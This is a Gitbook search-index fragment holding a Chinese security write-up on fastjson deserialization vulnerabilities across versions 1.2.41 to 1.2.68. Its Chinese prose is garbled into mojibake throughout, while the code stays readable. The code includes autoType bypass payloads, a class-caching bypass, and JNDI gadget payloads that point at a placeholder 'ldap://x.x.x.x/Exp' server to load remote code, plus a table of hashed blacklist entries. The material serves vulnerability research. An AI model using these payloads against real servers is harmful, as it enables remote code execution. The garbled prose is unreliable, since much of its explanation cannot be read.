è¿˜æœ‰ä¸€äº›ç•¸å½¢çš„payloadï¼Œå¯ä»¥å»å‰è¨€é‡Œé¢çœ‹çœ‹issueï¼ŒåŸç†éƒ½å·®ä¸å¤š åªæ˜¯å¤§ä½¬ä»¬å¯¹fastjsonçš„è§£ææµç¨‹çœŸçš„ç†è§£å¤ªé€å½»äº†ï¼Œç¾¡æ…•äº† å‚è€ƒæ–‡çŒ® é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³• Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/06.Fastjsonå„ç‰ˆæœ¬æ¼æ´åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/06.Fastjsonå„ç‰ˆæœ¬æ¼æ´åˆ†æ.html","title":"06.Fastjsonå„ç‰ˆæœ¬æ¼æ´åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ æ¦‚å¿µ æ¼”ç¤ºä»£ç  fastjson 1.2.24 fastjson 1.2.41 fastjson 1.2.42 fastjson 1.2.43 fastjson 1.2.45 fastjson 1.2.47 fastjson 1.2.62 fastjson 1.2.66 fastjson 1.2.68 fastjsoné»‘åå• Payloadè½¬æ¢ Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ å‚è€ƒé“¾æ¥ å‰è¨€ æœ€å…ˆå‡ºç°é—®é¢˜çš„Fastjson 1.2.24ååºåˆ—åŒ–æ¼æ´å·²ç»åˆ†æè¿‡äº†ï¼Œäº§ç”Ÿæ¼æ´çš„åŸç†ä¹Ÿå·®ä¸å¤šç†è§£äº† åœ¨1.2.25ä¹‹åçš„ç‰ˆæœ¬ï¼Œä»¥åŠæ‰€æœ‰çš„.sec01åç¼€ç‰ˆæœ¬ä¸­ï¼ŒautotypeåŠŸèƒ½é»˜è®¤æ˜¯å—é™çš„ï¼ˆé»‘ç™½åå•æœºåˆ¶ï¼‰ åœ¨1.2.68ä¹‹åçš„ç‰ˆæœ¬ï¼Œfastjsonå¢åŠ äº†safeModeçš„æ”¯æŒã€‚é…ç½®safeModeåï¼Œæ— è®ºç™½åå•å’Œé»‘åå•ï¼Œéƒ½ä¸æ”¯æŒautoType æ¦‚å¿µ å¯èƒ½å‡ºç°ä¸€äº›æ–°çš„æ¦‚å¿µï¼Œç»™ä¸€äº›å‚è€ƒé“¾æ¥å§ FastJSONä¸ºä»€ä¹ˆè¦æœ‰autoTypeåŠŸèƒ½ enable_autotype fastjson_safemode æ¼”ç¤ºä»£ç  åé¢çš„åˆ†æä»£ç éƒ½ä»¥æ­¤ä¸ºåŸºç¡€ä¿®æ”¹ package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(JSON.parseObject(json)); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } fastjson 1.2.24 ä¹‹å‰å·²ç»åˆ†æè¿‡äº†ï¼Œå°±ä¸åœ¨å†™äº† fastjson 1.2.41 åˆ©ç”¨çš„å‰ææ˜¯å¿…é¡»è¦æ‰‹åŠ¨å¼€å¯autoTypeSupportï¼Œä¸ç„¶è¿˜æ˜¯ä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥è¯´è¿˜æ˜¯æœ‰ä¸€ç‚¹é¸¡è‚‹å§ ä»ä»£ç ä¸­å¼€å¯autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); åœ¨1.2.25ä¹‹åçš„ç‰ˆæœ¬ï¼Œä»¥åŠæ‰€æœ‰çš„.sec01åç¼€ç‰ˆæœ¬ä¸­ï¼Œå¢åŠ äº†checkAutotypeå‡½æ•°ï¼ŒautotypeåŠŸèƒ½é»˜è®¤æ˜¯å—é™çš„ï¼ˆé»‘ç™½åå•æœºåˆ¶ï¼‰ ä½†åœ¨1.2.25åˆ°1.2.41ä¹‹é—´ï¼Œå‘ç”Ÿè¿‡ä¸€æ¬¡checkAutotypeçš„ç»•è¿‡ã€‚ Payloadå¦‚ä¸‹ {\"@type\":\"Lorg.example.User;\",\"age\":66,\"username\":\"test\"} æˆ‘ä»¬ç”¨è¿™ä¸ªpayloadæ¥åˆ†æä¸€ä¸‹å¦‚ä½•ç»•è¿‡çš„ï¼ˆfastjson 1.2.41ï¼‰ è¿›å…¥checkAutoTypeåï¼Œé¦–å…ˆä¼šå¯¹typeNameçš„é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªæ¡ä»¶æ»¡è¶³ä¸äº†ï¼Œæ‰€ä»¥ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ ç»§ç»­å‘ä¸‹ï¼Œå¼€å¯autoTypeSupportæ—¶ï¼Œä¼šå…ˆé€šè¿‡é»‘ç™½åå•æ¥åˆ¤æ–­ï¼Œå…ˆç™½åå•åé»‘åå• å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¼ å…¥çš„typeName Lorg.example.User;è‚¯å®šæ˜¯ä¸åœ¨é»‘åå•å†…çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªç»•è¿‡çš„ç‚¹ ç»§ç»­å‘ä¸‹ï¼Œå¦‚æœclazz==nullï¼Œå°±ä¼šè°ƒç”¨TypeUtils.getClassFromMapping(typeName);ï¼Œè·Ÿä¸€ä¸‹å…¶å®å°±æ˜¯ä»ä¸€ä¸ªConcurrentHashMapä¸­çœ‹çœ‹å­˜ä¸å­˜åœ¨è¿™ä¸ªç±»ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬ä¼ å…¥çš„Lå¼€å¤´çš„ç±»æ˜¯ä¸ä¼šå­˜åœ¨çš„ ç»§ç»­å‘ä¸‹ï¼Œå’Œä¸Šé¢ç±»ä¼¼ï¼Œæˆ‘ä»¬è¿™ä¸ªç±»è¿˜æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œæ‰€ä»¥clazzè¿˜æ˜¯null æ²¡å¼€å¯autoTypeSupportçš„æƒ…å†µä¸‹ï¼Œä¾ç„¶ä¼šè¿›è¡Œé»‘ç™½åå•æ£€æµ‹ï¼Œå…ˆé»‘åå•åç™½åå•ï¼Œæˆ‘ä»¬è¿™é‡Œæ‰‹åŠ¨å¼€å¯äº†æ‰€ä»¥è¿™é‡Œä¸ç®¡ï¼Œå› ä¸ºä¼šè·³è¿‡ å‰é¢é»‘åå•æ£€æµ‹éƒ½æ²¡é—®é¢˜ï¼Œå°±ä¼šå¼€å§‹åŠ è½½è¿™ä¸ªç±»äº† è·Ÿè¿›loadClassï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯[ï¼Œå°±ä¼šå»æ‰[å†å»è§£æï¼Œæˆ‘ä»¬è¿™é‡Œä¸æ»¡è¶³å°±å…ˆä¸çœ‹ï¼Œç»§ç»­å‘ä¸‹ è¿™ä¸ªæ¡ä»¶å°±æ˜¯è¿™æ¬¡ç»•è¿‡çš„æ ¸å¿ƒæ¡ä»¶äº† else if (className.startsWith(\"L\") && className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } å¦‚æœå¼€å¤´æ˜¯Lè€Œä¸”ç»“å°¾æ˜¯;ï¼Œé‚£ä¹ˆå°±ä¼šç»™å‰åè¿™ä¿©å­—ç¬¦å»æ‰ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„newClassNameå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„org.example.User åç»­å°±ä¼šåŠ è½½æˆ‘ä»¬çš„ç±»å®ä¾‹åŒ–ï¼Œè¾¾åˆ°æˆ‘ä»¬ç»•è¿‡çš„ç›®çš„ debugè¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å¤§å®¶æ³¨æ„åˆ°ä¸€ä¸ªç‚¹ï¼ŒloadClasså‡½æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯[ï¼Œå°±ä¼šå»æ‰[å†å»å®ä¾‹åŒ–ï¼Œé‚£è¿™ä¸ªåœ°æ–¹æ˜¯ä¸æ˜¯ä¹Ÿèƒ½ç”¨æ¥ç»•è¿‡å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯å½“ç„¶å¯ä»¥ï¼Œè¿™ä¸ªç»•è¿‡ç‚¹å°±ä½“ç°åœ¨1.2.43ç‰ˆæœ¬ä¸­ fastjson 1.2.42 1.2.41é—®é¢˜å‡ºç°åï¼Œ1.2.42ä¸­å°è¯•äº†ä¿®å¤ï¼Œä¿®å¤æ–¹å¼ https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf å¯»æ‰¾å†å²commitæŠ€å·§ï¼š releaseé‡Œé¢æ‰¾å¯¹åº”çš„ç‰ˆæœ¬çš„commit ç›´æ¥æœç´¢commit ç›´æ¥æœç´¢issue å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°ï¼Œç»™åŸæ¥çš„denyListå˜æˆäº†denyHashCodesï¼Œè®©å®‰å…¨ç ”ç©¶æ›´éš¾äº†ï¼Œä½†æ˜¯hashcodeçš„æ–¹æ³•æ˜¯å…¬å¼€çš„ï¼Œåªè¦jaråŒ…å¤Ÿå¤šè¿˜æ˜¯å¯ä»¥ç¢°æ’å‡ºæ¥çš„ï¼Œæ„Ÿè§‰æ²»æ ‡ä¸æ²»æœ¬ã€‚ã€‚ã€‚ åŒæ—¶å¯ä»¥çœ‹åˆ°é’ˆå¯¹æ¼æ´ç»•è¿‡çš„ä¿®å¤æ–¹å¼ï¼Œå¾ˆç®€å•ç²—æš´ï¼Œå¦‚æœå‘ç°å¼€å¤´æ˜¯Lè€Œä¸”ç»“å°¾æ˜¯;ï¼Œå°±ç›´æ¥å»æ‰ æ‰€ä»¥ç»•è¿‡æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ç”¨2ä¸ªLå’Œ2ä¸ª;å°±å¯ä»¥äº†ï¼ŒPayloadå¦‚ä¸‹ {\"@type\":\"LLorg.example.User;;\",\"age\":66,\"username\":\"test\"} fastjson 1.2.43 å¯¹LL;;å¯ä»¥ç»•è¿‡çš„æƒ…å†µåšäº†è¿‡æ»¤ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªL;ï¼Œå°±å»é™¤äº†åå†èµ°é»‘åå•å»è¿‡æ»¤çœ‹çœ‹æ˜¯å¦å…è®¸ååºåˆ—åŒ–ï¼Œç€å®å¤ªæ¶å¿ƒäº†çœ‹ç€ æ‰€ä»¥2ä¸ªLL;;æ˜¯è¡Œä¸é€šäº†ï¼Œä½†æ˜¯åˆ«å¿˜äº†æˆ‘ä»¬åœ¨åˆ†æ1.2.41çš„æ—¶å€™ï¼Œå‘ç°è¿˜ä¼šå»æ‰[ç„¶åå®ä¾‹åŒ–ï¼Œè¿™å°±æ˜¯ç»•è¿‡ç‚¹ åˆå§‹payload {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"} æŠ¥é”™exepct '[', but ,, pos 29, json : {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"}ï¼Œ29é‚£ä¸ªä½ç½®ï¼ŒæœŸæœ›ä¸€ä¸ª[ï¼Œä½†æ˜¯æ˜¯,ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ ä¸€ä¸ª[ {\"@type\":\"[org.example.User\"[,\"age\":66,\"username\":\"test\"} æŠ¥é”™syntax error, expect {, actual string, pos 30, fastjson-version 1.2.43ï¼ŒæœŸæœ›30çš„ä½ç½®æ˜¯ä¸€ä¸ª{ï¼ŒåŠ ä¸Š æœ€ç»ˆPOC {\"@type\":\"[org.example.User\"[{,\"age\":66,\"username\":\"test\"} çœ‹ç€æœ‰ç‚¹è¿·ï¼Œä¸ºå•¥åŠ ä¸Š[{å°±å¯ä»¥äº†ï¼Ÿ åˆ†æä¸€ä¸‹ï¼Œé€šè¿‡checkAutoTypeåï¼Œè¿”å›class [Lorg.example.User; ä¸€ç›´è·Ÿï¼Œå‘ç°è°ƒç”¨äº†deserializer.deserialzeï¼Œè·Ÿè¿›å»ï¼Œå‘ç°ä½¿ç”¨äº†clazz.getComponentType()ï¼Œæ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿå°±æ˜¯å‰é¢å»æ‰[çš„é‚£ä¸ªåœ°æ–¹ è¿™ä¸ªå‡½æ•°æ˜¯nativeçš„ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°ä»£ç ã€‚ã€‚ã€‚ä¸è¿‡æ ¹æ®ç»“æœæ¥çœ‹ï¼Œå°±æ˜¯å»æ‰[Lå’Œ;æ‹¿åˆ°ç±» å†ç»§ç»­å¾€ä¸‹ï¼Œè·Ÿè¿›parseArray å‘ç°å¦‚æœtoken != 14å°±ä¼šæŠ›å‡ºé”™è¯¯ï¼Œè€Œæ²¡æœ‰[çš„æ—¶å€™ï¼Œtokenæ˜¯16ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œ{ä¹Ÿç±»ä¼¼ï¼Œå¯ä»¥ä¸‹ä¸ªå¼‚å¸¸æ–­ç‚¹æ¥åˆ†æ æœ€åçœ‹ä¸‹åˆ°setXXXçš„è¿è¡Œå †æ ˆä¿¡æ¯ï¼Œç»“åˆå †æ ˆæ¥åˆ†æå¯ä»¥èŠ‚çº¦å¾ˆå¤šæ—¶é—´ setUsername:20, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseArray:729, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:183, ObjectArrayCodec (com.alibaba.fastjson.serializer) parseObject:373, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1338, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1304, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:10, App (org.example) fastjson 1.2.45 1.2.44ä¸­å¯¹[è¿›è¡Œäº†åˆ¤æ–­ï¼Œæˆ‘ä»¬ç”¨1.2.43çš„POCï¼Œç„¶åä¸‹ä¸ªJSONExceptionçš„å¼‚å¸¸æ–­ç‚¹ï¼Œçœ‹çœ‹æ˜¯æ€ä¹ˆåˆ¤æ–­çš„ è¿è¡Œåï¼Œåœ¨com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)æˆåŠŸæ‹¦æˆª åˆ†æä¸€ä¸‹ï¼Œå‘ç°å¦‚æœå¼€å¤´æ˜¯[å°±ç›´æ¥æŠ›å‡ºå¼‚å¸¸ é‚£å†çœ‹çœ‹1.2.41é‡Œé¢çš„ç»•æ³•å‘¢ï¼Œå‰é¢åŠ ä¸ªLï¼Œåé¢åŠ ä¸ª;ï¼Œå‘ç°ä¼šæ£€æŸ¥ç»“å°¾æ˜¯å¦ä¸º;ï¼Œæ˜¯çš„è¯ä¹ŸæŠ›å‡ºå¼‚å¸¸ å½“ç„¶è¿™ä¸ªç‰ˆæœ¬æ—¢ç„¶æœ‰RCEï¼Œè‚¯å®šä¸æ˜¯ä¹‹å‰çš„æ–¹æ³•ç»•è¿‡çš„ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡ä¸åœ¨é»‘åå•é‡Œé¢çš„ç±»æ¥ç»•è¿‡çš„ {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://x.x.x.x/Exp\"}} fastjson 1.2.47 è¿™ä¸ªç‰ˆæœ¬ç»•è¿‡äº†autoTypeSupportæ£€æµ‹ï¼Œä¸å¼€å¯astä¾ç„¶å¯ä»¥åˆ©ç”¨ï¼ˆ1.2.25 - 1.2.45 è¿™äº›ç»•è¿‡éƒ½æ˜¯éœ€è¦å¼€å¯astçš„ï¼‰ Payloadï¼š { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"org.example.User\" }, \"b\": { \"@type\": \"org.example.User\", \"username\": \"123456\", \"age\": 123 } } ç»•è¿‡åŸç†ï¼š åˆ©ç”¨åˆ°äº†java.lang.classï¼Œè¿™ä¸ªç±»ä¸åœ¨é»‘åå•ï¼Œæ‰€ä»¥checkAutotypeå¯ä»¥è¿‡ è¿™ä¸ªjava.lang.classç±»å¯¹åº”çš„deserializerä¸ºMiscCodecï¼Œdeserializeæ—¶ä¼šå–jsonä¸²ä¸­çš„valå€¼å¹¶loadè¿™ä¸ªvalå¯¹åº”çš„classï¼Œå¦‚æœfastjson cacheä¸ºtrueï¼Œå°±ä¼šç¼“å­˜è¿™ä¸ªvalå¯¹åº”çš„classåˆ°å…¨å±€mapä¸­ å¦‚æœå†æ¬¡åŠ è½½valåç§°çš„classï¼Œå¹¶ä¸”autotypeæ²¡å¼€å¯ï¼ˆå› ä¸ºå¼€å¯äº†ä¼šå…ˆæ£€æµ‹é»‘ç™½åå•ï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´å¼€å¯äº†åè€Œä¸æˆåŠŸï¼‰ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¼šå°è¯•ä»å…¨å±€mapä¸­è·å–è¿™ä¸ªclassï¼Œå¦‚æœè·å–åˆ°äº†ï¼Œç›´æ¥è¿”å› debugåˆ†æï¼š åœ¨setXXXçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œçœ‹ä¸‹è°ƒç”¨å †æ ˆä¿¡æ¯ setUsername:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1078, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:20, App (org.example) è¿›å…¥åˆ°parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)å¼€å§‹ä¸‹æ–­ç‚¹é‡æ–°è¿è¡Œåˆ†æ è·Ÿè¿›ï¼Œä¸€ç›´F8ï¼Œè¯†åˆ«åˆ°ä¼ å…¥çš„å‚æ•°aï¼Œç»§ç»­å‘ä¸‹ï¼Œè¯†åˆ«åˆ°åé¢è¿˜æ˜¯{å¼€å¤´åï¼Œé€’å½’è°ƒç”¨parseObject ç»§ç»­å¾€åè¯†åˆ«åˆ°@type ç„¶åå°±æ˜¯è¿›å…¥checkAutoTypeæ£€æŸ¥ï¼Œå› ä¸ºjava.lang.Classåœ¨this.deserializers.bucketsé‡Œé¢ï¼Œæ‰€ä»¥ç›´æ¥è¿”å›äº†class java.lang.Class é€šè¿‡äº†checkAutoTypeæ£€æŸ¥åï¼Œå¸¸è§„è°ƒç”¨deserializer.deserialzeè¿›è¡Œååºåˆ—åŒ–ï¼Œä½†è¿™é‡Œæ˜¯com.alibaba.fastjson.serializer.MiscCodec#deserialze è¿™é‡Œä¼šå–å‡ºæˆ‘ä»¬çš„å˜é‡valçš„å€¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ç±» ç„¶åå°±æ˜¯ä¸€ç³»åˆ—çš„Classçš„åˆ¤æ–­ï¼Œä¸€ç›´åˆ°Class.classï¼Œç„¶åä¼šè¿›å…¥loadClass è·Ÿè¿›loadClassï¼Œä¸€ç›´è·Ÿï¼Œå‘ç°åœ¨cacheä¸ºtrueçš„æ—¶å€™ï¼Œä¼šç›´æ¥ç»™å’±ä»¬çš„æ¶æ„ç±»åŠ å…¥åˆ°mappingsä¸­ï¼Œè€Œè¿™ä¸ªmappingsæ˜¯ä¸æ˜¯çœ‹ç€å¾ˆçœ¼ç†Ÿï¼Ÿåé¢åˆ†æ è¿™ä¸ªcacheé»˜è®¤å°±æ˜¯ä¸ºtrue ç„¶åå¼€å§‹å¤„ç†å­—æ®µbï¼Œå’Œä¸Šé¢ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¸€ç›´åˆ°checkAutoType å¯ä»¥çœ‹åˆ°æ­¤å¤„å¦‚æœå¼€å¯äº†autoTypeSupportæ£€æŸ¥ä¼šè¿›å…¥é»‘åå•æ£€æŸ¥ï¼Œåè€Œå½±å“æˆ‘ä»¬çš„payload è·Ÿè¿›ä¸‹æ–¹çš„getClassFromMappingï¼Œå¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸Šé¢æˆ‘ä»¬æ·»åŠ æ¶æ„ç±»çš„é‚£ä¸ªMappingï¼Œä»æ­¤ç»•è¿‡äº†checkAutoTypeæ£€æŸ¥ åˆ°æ­¤å·®ä¸å¤šå°±ç»“æŸäº†ï¼Œå¤§ä½¬å°±æ˜¯å¤§ä½¬ï¼Œå¤ªç‰›äº† fastjson 1.2.62 1.2.47åè‚¯å®šä¿®å¤äº†ï¼Œæ€ä¹ˆä¿®çš„å‘¢ï¼Ÿæˆ‘ä»¬ç”¨1.2.62å»è¯•è¯•1.2.47çš„POC æŠ›å‡ºäº†ä¸€åœºï¼Œç„¶åä¸‹ä¸ªå¼‚å¸¸æ–­ç‚¹ï¼Œåˆ†æä¸€ä¸‹ï¼Œçœ‹æ ·å­æ˜¯å‰é¢æŸä¸ªåœ°æ–¹è®¾ç½®äº†autoTypeSupportçš„å€¼ å’±ä»¬è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡ï¼Œä¸‹ä¸ªå­—æ®µæ–­ç‚¹ å‘ç°æ¥æºæ˜¯è¿™ è·Ÿä¸€ä¸‹AUTO_SUPPORTï¼ŒåŸæ¥æ˜¯ä»é…ç½®æ–‡ä»¶é‡Œé¢è¯»æ˜¯å¦å¼€å¯äº†autoTypeSupportã€‚ã€‚ã€‚å¤§æ„äº† é‚£æˆ‘ä»¬å¼€å¯aståå†è¯•è¯• ç»“æœå°±æ˜¯java.lang.Classè¢«åŠ å…¥åˆ°äº†é»‘åå• æ®è¯´ä¿®å¤è¿˜å°†cacheé»˜è®¤è®¾ç½®ä¸ºfalseäº†ï¼Œå»TypeUtilsç±»çœ‹çœ‹ï¼Œå‘ç°ç¡®å®å¦‚æ­¤ 1.2.62çš„RCEä¹Ÿå¾ˆç®€å•ï¼Œç”±äºCVE-2020-8840çš„gadgetç»•è¿‡äº†fastjsonçš„é»‘åå•è€Œå¯¼è‡´çš„ï¼Œå½“æœåŠ¡ç«¯å­˜åœ¨æ”¶åˆ°æ¼æ´å½±å“çš„xbean-reflectä¾èµ–å¹¶ä¸”å¼€å¯fastjsonçš„autotypeæ—¶ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åŒ…è§¦å‘æ¼æ´ä»è€Œå¯¼è‡´åœ¨æœåŠ¡ç«¯ä¸Šé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.66 å’Œ1.2.62ç±»ä¼¼ï¼Œåœ¨å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ï¼Œç”±äºé»‘åå•è¿‡æ»¤ä¸å…¨è€Œå¯¼è‡´çš„ç»•è¿‡é—®é¢˜ {\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.68 è¿™ä¸ªæ–‡æ¡£å¤ªå¤§äº†å¤ªå¡äº†ï¼Œåé¢å•ç‹¬åˆ†æ fastjsoné»‘åå• å‚è€ƒhttps://github.com/LeadroyaL/fastjson-blacklist fastjson åœ¨1.2.42å¼€å§‹ï¼ŒæŠŠåŸæœ¬æ˜æ–‡çš„é»‘åå•æ”¹æˆäº†å“ˆå¸Œè¿‡çš„é»‘åå•ï¼Œé˜²æ­¢å®‰å…¨ç ”ç©¶è€…å¯¹å…¶è¿›è¡Œç ”ç©¶ã€‚åœ¨ https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd è¿™æ¬¡commitä¸­ä½“ç°å‡ºæ¥ã€‚ fastjson åœ¨1.2.61å¼€å§‹ï¼Œåœ¨https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38ä¸­ï¼ŒæŠŠé»‘åå•ä»åè¿›åˆ¶æ•°å˜æˆäº†åå…­è¿›åˆ¶æ•°ï¼Œå¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶è€…è¿›è¡Œæœç´¢ å¯¹ç…§è¡¨ version hash hex-hash name 1.2.42 -8720046426850100497 0x86fc2bf9beaf7aefL org.apache.commons.collections4.comparators 1.2.42 -8109300701639721088 0x8f75f9fa0df03f80L org.python.core 1.2.42 -7966123100503199569 0x9172a53f157930afL org.apache.tomcat 1.2.42 -7766605818834748097 0x9437792831df7d3fL org.apache.xalan 1.2.42 -6835437086156813536 0xa123a62f93178b20L javax.xml 1.2.42 -4837536971810737970 0xbcdd9dc12766f0ceL org.springframework. 1.2.42 -4082057040235125754 0xc7599ebfe3e72406L org.apache.commons.beanutils 1.2.42 -2364987994247679115 0xdf2ddff310cdb375L org.apache.commons.collections.Transformer 1.2.42 -1872417015366588117 0xe603d6a51fad692bL org.codehaus.groovy.runtime 1.2.42 -254670111376247151 0xfc773ae20c827691L java.lang.Thread 1.2.42 -190281065685395680 0xfd5bfc610056d720L javax.net. 1.2.42 313864100207897507 0x45b11bc78a3aba3L com.mchange 1.2.42 1203232727967308606 0x10b2bdca849d9b3eL org.apache.wicket.util 1.2.42 1502845958873959152 0x14db2e6fead04af0L java.util.jar. 1.2.42 3547627781654598988 0x313bb4abd8d4554cL org.mozilla.javascript 1.2.42 3730752432285826863 0x33c64b921f523f2fL java.rmi 1.2.42 3794316665763266033 0x34a81ee78429fdf1L java.util.prefs. 1.2.42 4147696707147271408 0x398f942e01920cf0L com.sun. 1.2.42 5347909877633654828 0x4a3797b30328202cL java.util.logging. 1.2.42 5450448828334921485 0x4ba3e254e758d70dL org.apache.bcel 1.2.42 5751393439502795295 0x4fd10ddc6d13821fL java.net.Socket 1.2.42 5944107969236155580 0x527db6b46ce3bcbcL org.apache.commons.fileupload 1.2.42 6742705432718011780 0x5d92e6ddde40ed84L org.jboss 1.2.42 7179336928365889465 0x63a220e60a17c7b9L org.hibernate 1.2.42 7442624256860549330 0x6749835432e0f0d2L org.apache.commons.collections.functors 1.2.42 8838294710098435315 0x7aa7ee3627a19cf3L org.apache.myfaces.context.servlet 1.2.43 -2262244760619952081 0xe09ae4604842582fL java.net.URL 1.2.46 -8165637398350707645 0x8eadd40cb2a94443L junit. 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 1.2.46 -7921218830998286408 0x92122d710e364fb8L org.osjava.sj. 1.2.46 -7768608037458185275 0x94305c26580f73c5L org.apache.log4j. 1.2.46 -6179589609550493385 0xaa3daffdb10c4937L org.logicalcobwebs. 1.2.46 -5194641081268104286 0xb7e8ed757f5d13a2L org.apache.logging. 1.2.46 -3935185854875733362 0xc963695082fd728eL org.apache.commons.dbcp 1.2.46 -2753427844400776271 0xd9c9dbf6bbd27bb1L com.ibatis.sqlmap.engine.datasource 1.2.46 -1589194880214235129 0xe9f20bad25f60807L org.jdom. 1.2.46 1073634739308289776 0xee6511b66fd5ef0L org.slf4j. 1.2.46 5688200883751798389 0x4ef08c90ff16c675L javassist. 1.2.46 7017492163108594270 0x616323f12c2ce25eL oracle.net 1.2.46 8389032537095247355 0x746bd4a53ec195fbL org.jaxen. 1.2.48 